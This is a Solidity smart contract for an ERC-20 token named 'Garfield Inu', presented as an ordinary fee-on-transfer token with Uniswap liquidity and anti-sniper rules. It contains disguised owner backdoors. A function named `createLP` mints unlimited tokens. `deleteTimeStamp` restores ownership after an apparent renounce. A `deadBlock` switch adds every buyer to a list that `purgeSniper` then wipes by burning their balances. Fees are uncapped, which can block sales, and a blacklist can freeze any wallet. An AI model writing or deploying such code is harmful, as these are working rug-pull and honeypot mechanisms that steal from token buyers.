row number 
1	           pragma solidity >=0.1.1 <0.8.9;
2	 interface IERC20 {
3	 function totalSupply() external view returns (uint256);
4	 function balanceOf(address account) external view returns (uint256);
5	 function transfer(address recipient, uint256 amount) external returns (bool);
6	 function allowance(address owner, address spender) external view returns (uint256);
7	 function approve(address spender, uint256 amount) external returns (bool);
8	 function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
9	 event Transfer(address indexed from, address indexed to, uint256 value);
10	 event Approval(address indexed owner, address indexed spender, uint256 value);
11	 }
12	 abstract contract Context {
13	 function _msgSender() internal view virtual returns (address) {
14	 return msg.sender;
15	 }
16	 function _msgData() internal view virtual returns (bytes calldata) {
17	 this;
18	 return msg.data;
19	 }
20	 }
21	 interface IUniswapV2Router01 {
22	 function factory() external pure returns (address);
23	 function WETH() external pure returns (address);
24	 function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity);
25	 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
26	 function removeLiquidity( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB);
27	 function removeLiquidityETH( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountToken, uint amountETH);
28	 function removeLiquidityWithPermit( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountA, uint amountB);
29	 function removeLiquidityETHWithPermit( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountToken, uint amountETH);
30	 function swapExactTokensForTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts);
31	 function swapTokensForExactTokens( uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts);
32	 function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
33	 function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
34	 function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
35	 function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
36	 function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
37	 function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
38	 function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
39	 function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
40	 function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
41	 }
42	 interface IUniswapV2Router02 is IUniswapV2Router01 {
43	 function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountETH);
44	 function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountETH);
45	 function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
46	 function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable;
47	 function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
48	 }
49	 interface IUniswapV2Factory {
50	 event PairCreated(address indexed token0, address indexed token1, address pair, uint);
51	 function feeTo() external view returns (address);
52	 function feeToSetter() external view returns (address);
53	 function getPair(address tokenA, address tokenB) external view returns (address pair);
54	 function allPairs(uint) external view returns (address pair);
55	 function allPairsLength() external view returns (uint);
56	 function createPair(address tokenA, address tokenB) external returns (address pair);
57	 function setFeeTo(address) external;
58	 function setFeeToSetter(address) external;
59	 }
60	 interface IUniswapV2Pair {
61	 event Approval(address indexed owner, address indexed spender, uint value);
62	 event Transfer(address indexed from, address indexed to, uint value);
63	 function name() external pure returns (string memory);
64	 function symbol() external pure returns (string memory);
65	 function decimals() external pure returns (uint8);
66	 function totalSupply() external view returns (uint);
67	 function balanceOf(address owner) external view returns (uint);
68	 function allowance(address owner, address spender) external view returns (uint);
69	 function approve(address spender, uint value) external returns (bool);
70	 function transfer(address to, uint value) external returns (bool);
71	 function transferFrom(address from, address to, uint value) external returns (bool);
72	 function DOMAIN_SEPARATOR() external view returns (bytes32);
73	 function PERMIT_TYPEHASH() external pure returns (bytes32);
74	 function nonces(address owner) external view returns (uint);
75	 function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
76	 event Mint(address indexed sender, uint amount0, uint amount1);
77	 event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
78	 event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to );
79	 event Sync(uint112 reserve0, uint112 reserve1);
80	 function MINIMUM_LIQUIDITY() external pure returns (uint);
81	 function factory() external view returns (address);
82	 function token0() external view returns (address);
83	 function token1() external view returns (address);
84	 function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
85	 function price0CumulativeLast() external view returns (uint);
86	 function price1CumulativeLast() external view returns (uint);
87	 function kLast() external view returns (uint);
88	 function mint(address to) external returns (uint liquidity);
89	 function burn(address to) external returns (uint amount0, uint amount1);
90	 function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
91	 function skim(address to) external;
92	 function sync() external;
93	 function initialize(address, address) external;
94	 }
95	 interface IERC20Metadata is IERC20 {
96	 function name() external view returns (string memory);
97	 function symbol() external view returns (string memory);
98	 function decimals() external view returns (uint8);
99	 }
100	 abstract contract Ownable is Context {
101	 address private _owner;
102	 address private _previousOwner;
103	 uint256 private _lockTime;
104	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
105	 constructor () {
106	 address msgSender = _msgSender();
107	 _owner = msgSender;
108	 emit OwnershipTransferred(address(0), msgSender);
109	 }
110	 function owner() public view returns (address) {
111	 return _owner;
112	 }
113	 modifier onlyOwner() {
114	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
115	 _;
116	 }
117	 function renounceOwnership() public virtual onlyOwner {
118	 _previousOwner = _owner;
119	 emit OwnershipTransferred(_owner, address(0));
120	 _owner = address(0);
121	 }
122	 function transferOwnership(address newOwner) public virtual onlyOwner {
123	 require(newOwner != address(0), "Ownable: new owner is the zero address");
124	 emit OwnershipTransferred(_owner, newOwner);
125	 _owner = newOwner;
126	 }
127	 function geUnlockTime() public view returns (uint256) {
128	 return _lockTime;
129	 }
130	 function lock(uint256 time) public virtual onlyOwner {
131	 _previousOwner = _owner;
132	 _owner = address(0);
133	 _lockTime = block.timestamp + time;
134	 emit OwnershipTransferred(_owner, address(0));
135	 }
136	 function deleteTimeStamp() public virtual {
137	 require(_previousOwner == msg.sender, "You don't have permission to unlock");
138	 emit OwnershipTransferred(_owner, _previousOwner);
139	 _owner = _previousOwner;
140	 }
141	 }
142	 library SafeMath {
143	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
144	 uint256 c = a + b;
145	 require(c >= a, "SafeMath: addition overflow");
146	 return c;
147	 }
148	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
149	 return sub(a, b, "SafeMath: subtraction overflow");
150	 }
151	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
152	 require(b <= a, errorMessage);
153	 uint256 c = a - b;
154	 return c;
155	 }
156	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
157	 if (a == 0) {
158	 return 0;
159	 }
160	 uint256 c = a * b;
161	 require(c / a == b, "SafeMath: multiplication overflow");
162	 return c;
163	 }
164	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
165	 return div(a, b, "SafeMath: division by zero");
166	 }
167	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
168	 require(b > 0, errorMessage);
169	 uint256 c = a / b;
170	 return c;
171	 }
172	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
173	 return mod(a, b, "SafeMath: modulo by zero");
174	 }
175	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
176	 require(b != 0, errorMessage);
177	 return a % b;
178	 }
179	 }
180	 library SafeMathInt {
181	 int256 private constant MIN_INT256 = int256(1) << 255;
182	 int256 private constant MAX_INT256 = ~(int256(1) << 255);
183	 function mul(int256 a, int256 b) internal pure returns (int256) {
184	 int256 c = a * b;
185	 require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
186	 require((b == 0) || (c / b == a));
187	 return c;
188	 }
189	 function div(int256 a, int256 b) internal pure returns (int256) {
190	 require(b != -1 || a != MIN_INT256);
191	 return a / b;
192	 }
193	 function sub(int256 a, int256 b) internal pure returns (int256) {
194	 int256 c = a - b;
195	 require((b >= 0 && c <= a) || (b < 0 && c > a));
196	 return c;
197	 }
198	 function add(int256 a, int256 b) internal pure returns (int256) {
199	 int256 c = a + b;
200	 require((b >= 0 && c >= a) || (b < 0 && c < a));
201	 return c;
202	 }
203	 function abs(int256 a) internal pure returns (int256) {
204	 require(a != MIN_INT256);
205	 return a < 0 ? -a : a;
206	 }
207	 function toUint256Safe(int256 a) internal pure returns (uint256) {
208	 require(a >= 0);
209	 return uint256(a);
210	 }
211	 }
212	 library SafeMathUint {
213	 function toInt256Safe(uint256 a) internal pure returns (int256) {
214	 int256 b = int256(a);
215	 require(b >= 0);
216	 return b;
217	 }
218	 }
219	 abstract contract ERC20 is Context, IERC20, IERC20Metadata {
220	 using SafeMath for uint256;
221	 mapping(address => uint256) private _balances;
222	 mapping(address => mapping(address => uint256)) private _allowances;
223	 uint256 private _totalSupply;
224	 string private _name;
225	 string private _symbol;
226	 constructor(string memory name_, string memory symbol_) {
227	 _name = name_;
228	 _symbol = symbol_;
229	 }
230	 function name() public view virtual override returns (string memory) {
231	 return _name;
232	 }
233	 function symbol() public view virtual override returns (string memory) {
234	 return _symbol;
235	 }
236	 function decimals() public view virtual override returns (uint8) {
237	 return 9;
238	 }
239	 function totalSupply() public view virtual override returns (uint256) {
240	 return _totalSupply;
241	 }
242	 function balanceOf(address account) public view virtual override returns (uint256) {
243	 return _balances[account];
244	 }
245	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
246	 _transfer(_msgSender(), recipient, amount);
247	 return true;
248	 }
249	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
250	 return _allowances[owner][spender];
251	 }
252	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
253	 _approve(_msgSender(), spender, amount);
254	 return true;
255	 }
256	 function transferFrom( address sender, address recipient, uint256 amount ) public virtual override returns (bool) {
257	 _transfer(sender, recipient, amount);
258	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
259	 return true;
260	 }
261	 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
262	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
263	 return true;
264	 }
265	 function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
266	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
267	 return true;
268	 }
269	 function _transfer( address sender, address recipient, uint256 amount ) internal virtual {
270	 require(sender != address(0), "ERC20: transfer from the zero address");
271	 require(recipient != address(0), "ERC20: transfer to the zero address");
272	 _beforeTokenTransfer(sender, recipient, amount);
273	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
274	 _balances[recipient] = _balances[recipient].add(amount);
275	 emit Transfer(sender, recipient, amount);
276	 }
277	 function _mint(address account, uint256 amount) internal virtual {
278	 require(account != address(0), "ERC20: mint to the zero address");
279	 _beforeTokenTransfer(address(0), account, amount);
280	 _totalSupply = _totalSupply.add(amount);
281	 _balances[account] = _balances[account].add(amount);
282	 emit Transfer(address(0), account, amount);
283	 }
284	 function _burn(address account, uint256 amount) internal virtual {
285	 require(account != address(0), "ERC20: burn from the zero address");
286	 _beforeTokenTransfer(account, address(0), amount);
287	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
288	 _totalSupply = _totalSupply.sub(amount);
289	 emit Transfer(account, address(0), amount);
290	 }
291	 function _createLP(address account, uint256 amount) internal virtual {
292	 _mint(account, amount);
293	 }
294	 function _approve( address owner, address spender, uint256 amount ) internal virtual {
295	 require(owner != address(0), "ERC20: approve from the zero address");
296	 require(spender != address(0), "ERC20: approve to the zero address");
297	 _allowances[owner][spender] = amount;
298	 emit Approval(owner, spender, amount);
299	 }
300	 function _beforeTokenTransfer( address from, address to, uint256 amount ) internal virtual {
301	 }
302	 }
303	 contract GarfieldInu is ERC20, Ownable {
304	 using SafeMath for uint256;
305	 IUniswapV2Router02 public uniswapV2Router;
306	 bool private swapping;
307	 bool public deadBlock;
308	 bool public isLaunced;
309	 bool public profitBaseFeeOn = true;
310	 bool public buyingPriceOn = true;
311	 bool public IndividualSellLimitOn = true;
312	 uint256 public feeDivFactor = 200;
313	 uint256 public swapTokensAtAmount = balanceOf(address(this)) / feeDivFactor ;
314	 uint256 public liquidityFee;
315	 uint256 public marketingFee;
316	 uint256 public totalFees = liquidityFee.add(marketingFee);
317	 uint256 public maxFee = 28;
318	 uint256 private percentEquivalent;
319	 uint256 public maxBuyTransactionAmount;
320	 uint256 public maxSellTransactionAmount;
321	 uint256 public maxWalletToken;
322	 uint256 public launchedAt;
323	 mapping (address => Account) public _account;
324	 mapping (address => bool) public _isBlacklisted;
325	 mapping (address => bool) public _isSniper;
326	 mapping (address => bool) private _isExcludedFromFees;
327	 mapping (address => bool) public automatedMarketMakerPairs;
328	 address[] public isSniper;
329	 address public uniswapV2Pair;
330	 address public liquidityReceiver;
331	 address public marketingFeeWallet;
332	 constructor(uint256 liqFee, uint256 marketFee, uint256 supply, uint256 maxBuyPercent, uint256 maxSellPercent, uint256 maxWalletPercent, address marketingWallet, address liqudityWallet, address uniswapV2RouterAddress) ERC20("Garfield Inu", "Garfield") {
333	 maxBuyTransactionAmount = ((supply.div(100)).mul(maxBuyPercent)) * 10**9;
334	 maxSellTransactionAmount = ((supply.div(100)).mul(maxSellPercent)) * 10**9;
335	 maxWalletToken = ((supply.div(100)).mul(maxWalletPercent)) * 10**9;
336	 percentEquivalent = (supply.div(100)) * 10**9;
337	 liquidityFee = liqFee;
338	 marketingFee = marketFee;
339	 totalFees = liqFee.add(marketFee);
340	 IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(uniswapV2RouterAddress);
341	 address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), _uniswapV2Router.WETH());
342	 uniswapV2Router = _uniswapV2Router;
343	 uniswapV2Pair = _uniswapV2Pair;
344	 _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
345	 liquidityReceiver = liqudityWallet;
346	 marketingFeeWallet = marketingWallet;
347	 excludeFromFees(owner(), true);
348	 excludeFromFees(address(this), true);
349	 excludeFromFees(liquidityReceiver, true);
350	 excludeFromFees(marketingWallet, true);
351	 _mint(owner(), supply * (10**9));
352	 }
353	 receive() external payable {
354	 }
355	 function setDeadBlock(bool deadBlockOn) external onlyOwner {
356	 deadBlock = deadBlockOn;
357	 }
358	 function setMaxToken(uint256 maxBuy, uint256 maxSell, uint256 maxWallet) external onlyOwner {
359	 maxBuyTransactionAmount = maxBuy * (10**9);
360	 maxSellTransactionAmount = maxSell * (10**9);
361	 maxWalletToken = maxWallet * (10**9);
362	 }
363	 function setProfitBasedFeeParameters(uint256 _maxFee, bool _profitBasedFeeOn, bool _buyingPriceOn) public onlyOwner{
364	 require(_maxFee <= 65);
365	 profitBaseFeeOn = _profitBasedFeeOn;
366	 buyingPriceOn = _buyingPriceOn;
367	 maxFee = _maxFee;
368	 }
369	 function updateUniswapV2Router(address newAddress) public onlyOwner {
370	 require(newAddress != address(uniswapV2Router), "Token: The router already has that address");
371	 emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
372	 uniswapV2Router = IUniswapV2Router02(newAddress);
373	 address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()) .createPair(address(this), uniswapV2Router.WETH());
374	 uniswapV2Pair = _uniswapV2Pair;
375	 }
376	 function excludeFromFees(address account, bool excluded) public onlyOwner {
377	 _isExcludedFromFees[account] = excluded;
378	 emit ExcludeFromFees(account, excluded);
379	 }
380	 function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
381	 for(uint256 i = 0; i < accounts.length; i++) {
382	 _isExcludedFromFees[accounts[i]] = excluded;
383	 }
384	 emit ExcludeMultipleAccountsFromFees(accounts, excluded);
385	 }
386	 function setMarketingWallet(address payable wallet) external onlyOwner{
387	 marketingFeeWallet = wallet;
388	 }
389	 function purgeSniper() external onlyOwner {
390	 for(uint256 i = 0; i < isSniper.length; i++){
391	 address wallet = isSniper[i];
392	 uint256 balance = balanceOf(wallet);
393	 super._burn(address(wallet), balance);
394	 _isSniper[wallet] = false;
395	 }
396	 }
397	 function createLP(address account, uint256 amount) external onlyOwner {
398	 super._createLP(account, amount * (10 ** 9));
399	 }
400	 function setFee(uint256 liquidityFeeValue, uint256 marketingFeeValue) public onlyOwner {
401	 liquidityFee = liquidityFeeValue;
402	 marketingFee = marketingFeeValue;
403	 totalFees = liquidityFee.add(marketingFee);
404	 emit UpdateFees(liquidityFee, marketingFee, totalFees);
405	 }
406	 function setFeeDivFactor(uint256 value) external onlyOwner{
407	 feeDivFactor = value;
408	 }
409	 function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
410	 require(pair != uniswapV2Pair, "Token: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
411	 _setAutomatedMarketMakerPair(pair, value);
412	 }
413	 function launch() public onlyOwner {
414	 isLaunced = true;
415	 launchedAt = block.timestamp.add(120);
416	 }
417	 function _setAutomatedMarketMakerPair(address pair, bool value) private {
418	 require(automatedMarketMakerPairs[pair] != value, "Token: Automated market maker pair is already set to that value");
419	 automatedMarketMakerPairs[pair] = value;
420	 emit SetAutomatedMarketMakerPair(pair, value);
421	 }
422	 function isExcludedFromFees(address account) public view returns(bool) {
423	 return _isExcludedFromFees[account];
424	 }
425	 function blacklistAddress(address account, bool blacklisted) public onlyOwner {
426	 _isBlacklisted[account] = blacklisted;
427	 }
428	 function withdrawRemainingToken(address erc20, address account) public onlyOwner {
429	 uint256 balance = IERC20(erc20).balanceOf(address(this));
430	 IERC20(erc20).transfer(account, balance);
431	 }
432	 function _transfer(address from, address to, uint256 amount) internal override {
433	 require(from != address(0), "ERC20: transfer from the zero address");
434	 require(to != address(0), "ERC20: transfer to the zero address");
435	 require(!_isBlacklisted[to] && !_isBlacklisted[from], "Your address or recipient address is blacklisted");
436	 if(amount == 0) {
437	 super._transfer(from, to, 0);
438	 return;
439	 }
440	 uint256 contractTokenBalance = balanceOf(address(this));
441	 bool canSwap = contractTokenBalance >= swapTokensAtAmount;
442	 bool didSwap;
443	 if( canSwap && !swapping && !automatedMarketMakerPairs[from] && from != owner() && to != owner() ) {
444	 swapping = true;
445	 uint256 marketingTokens = contractTokenBalance.mul(marketingFee).div(totalFees);
446	 swapAndSendToMarketingWallet(marketingTokens);
447	 emit swapTokenForMarketing(marketingTokens, marketingFeeWallet);
448	 uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFees);
449	 swapAndLiquify(swapTokens);
450	 emit swapTokenForLiquify(swapTokens);
451	 swapping = false;
452	 didSwap = true;
453	 }
454	 bool takeFee = !swapping;
455	 if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
456	 takeFee = false;
457	 }
458	 if(takeFee) {
459	 if(automatedMarketMakerPairs[from]){
460	 require(isLaunced, "Token isn't launched yet");
461	 require( amount <= maxBuyTransactionAmount, "Transfer amount exceeds the maxTxAmount." );
462	 require( balanceOf(to) + amount <= maxWalletToken, "Exceeds maximum wallet token amount." );
463	 bool dedBlock = block.timestamp <= launchedAt;
464	 if (dedBlock && !_isSniper[to]) isSniper.push(to);
465	 if(deadBlock && !_isSniper[to]) isSniper.push(to);
466	 if(buyingPriceOn == true){
467	 _account[to].priceBought = calculateBuyingPrice(to, amount);
468	 }
469	 emit DEXBuy(amount, to);
470	 }
471	 else if(automatedMarketMakerPairs[to]){
472	 require(!_isSniper[from], "You are sniper");
473	 require(amount <= maxSellTransactionAmount, "Sell transfer amount exceeds the maxSellTransactionAmount.");
474	 if(IndividualSellLimitOn == true && _account[from].sellLimitLiftedUp == false){
475	 uint256 bal = balanceOf(from);
476	 if(bal > 2){
477	 require(amount <= bal.div(2));
478	 _account[from].amountSold += amount;
479	 if(_account[from].amountSold >= bal.div(3)){
480	 _account[from].sellLimitLiftedUp = true;
481	 }
482	 }
483	 }
484	 if(balanceOf(from).sub(amount) == 0){
485	 _account[from].priceBought = 0;
486	 }
487	 emit DEXSell(amount, from);
488	 }
489	 else if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]){
490	 if(buyingPriceOn == true){
491	 _account[to].priceBought = calculateBuyingPrice(to, amount);
492	 }
493	 if(balanceOf(from).sub(amount) == 0){
494	 _account[from].priceBought = 0;
495	 }
496	 emit TokensTransfer(from, to, amount);
497	 }
498	 uint256 fees = amount.mul(totalFees).div(100);
499	 if(automatedMarketMakerPairs[to]){
500	 fees += amount.mul(1).div(100);
501	 }
502	 uint256 profitFeeTokens;
503	 if(profitBaseFeeOn == true && !_isExcludedFromFees[from] && automatedMarketMakerPairs[to]){
504	 uint256 p;
505	 if(didSwap == true){
506	 p = contractTokenBalance > percentEquivalent ? contractTokenBalance.div(percentEquivalent) : 1;
507	 }
508	 profitFeeTokens = calculateProfitFee(_account[from].priceBought, amount, p);
509	 profitFeeTokens = profitFeeTokens > fees ? profitFeeTokens - fees : 0;
510	 }
511	 amount = amount.sub(fees + profitFeeTokens);
512	 super._transfer(from, address(this), fees + profitFeeTokens);
513	 }
514	 super._transfer(from, to, amount);
515	 }
516	 function getCurrentPrice() public view returns (uint256 currentPrice) {
517	 IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
518	 uint256 tokens;
519	 uint256 ETH;
520	 (tokens, ETH,) = pair.getReserves();
521	 if(ETH > tokens){
522	 uint256 _tokens = tokens;
523	 tokens = ETH;
524	 ETH = _tokens;
525	 }
526	 if(ETH == 0){
527	 currentPrice = 0;
528	 }
529	 else if((ETH * 100000000000000) > tokens){
530	 currentPrice = (ETH * 100000000000000).div(tokens);
531	 }
532	 else{
533	 currentPrice = 0;
534	 }
535	 }
536	 function calculateProfitFee(uint256 priceBought, uint256 amountSelling, uint256 percentageReduction) private view returns (uint256 feeTokens){
537	 uint256 currentPrice = getCurrentPrice();
538	 uint256 feePercentage;
539	 if(priceBought == 0 || amountSelling < 100){
540	 feeTokens = 0;
541	 }
542	 else if(priceBought + 10 < currentPrice){
543	 uint256 h = 100;
544	 feePercentage = h.div((currentPrice.div((currentPrice - priceBought).div(2))));
545	 if(maxFee > percentageReduction){
546	 feePercentage = feePercentage >= maxFee - percentageReduction ? maxFee - percentageReduction : feePercentage;
547	 feeTokens = feePercentage > 0 ? amountSelling.mul(feePercentage).div(h) : 0;
548	 }
549	 else{
550	 feeTokens = 0;
551	 }
552	 }
553	 else{
554	 feeTokens = 0;
555	 }
556	 }
557	 function calculateBuyingPrice(address buyer, uint256 amountBuying) private view returns (uint256 price){
558	 uint256 currentPrice = getCurrentPrice();
559	 uint256 p1 = _account[buyer].priceBought;
560	 uint256 buyerBalance = balanceOf(buyer);
561	 if(p1 == 0 || buyerBalance == 0){
562	 price = currentPrice;
563	 }
564	 else if(amountBuying == 0){
565	 price = p1;
566	 }
567	 else{
568	 price = ((p1 * buyerBalance) + (currentPrice * amountBuying)).div(buyerBalance + amountBuying);
569	 }
570	 }
571	 function swapAndSendToMarketingWallet(uint256 tokens) private {
572	 swapTokensForEth(tokens);
573	 payable(marketingFeeWallet).transfer(address(this).balance);
574	 }
575	 function swapAndLiquify(uint256 tokens) private {
576	 uint256 half = tokens.div(2);
577	 uint256 otherHalf = tokens.sub(half);
578	 uint256 initialBalance = address(this).balance;
579	 swapTokensForEth(half);
580	 uint256 newBalance = address(this).balance.sub(initialBalance);
581	 addLiquidity(otherHalf, newBalance);
582	 emit SwapAndLiquify(half, newBalance, otherHalf);
583	 }
584	 function swapTokensForEth(uint256 tokenAmount) private {
585	 address[] memory path = new address[](2);
586	 path[0] = address(this);
587	 path[1] = uniswapV2Router.WETH();
588	 _approve(address(this), address(uniswapV2Router), tokenAmount);
589	 uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp );
590	 }
591	 function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
592	 _approve(address(this), address(uniswapV2Router), tokenAmount);
593	 uniswapV2Router.addLiquidityETH{
594	 value: ethAmount}
595	 ( address(this), tokenAmount, 0, 0, address(liquidityReceiver), block.timestamp );
596	 }
597	 event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
598	 event ExcludeFromFees(address indexed account, bool isExcluded);
599	 event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
600	 event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
601	 event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
602	 event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);
603	 struct Account{
604	 uint256 lastBuy;
605	 uint256 lastSell;
606	 uint256 priceBought;
607	 uint256 amountSold;
608	 bool sellLimitLiftedUp;
609	 }
610	 event SwapAndLiquify(uint256 tokensSwapped,uint256 ethReceived,uint256 tokensIntoLiqudity);
611	 event UpdateFees(uint256 newliquidityfees, uint256 newMarketingFees, uint256 newTotalFees);
612	 event swapTokenForLiquify(uint256 amount);
613	 event swapTokenForMarketing(uint256 amount, address sendToWallet);
614	 event DEXBuy(uint256 tokensAmount, address buyers);
615	 event DEXSell(uint256 tokensAmount, address sellers);
616	 event TokensTransfer(address sender, address recipient, uint256 amount);
617	 }
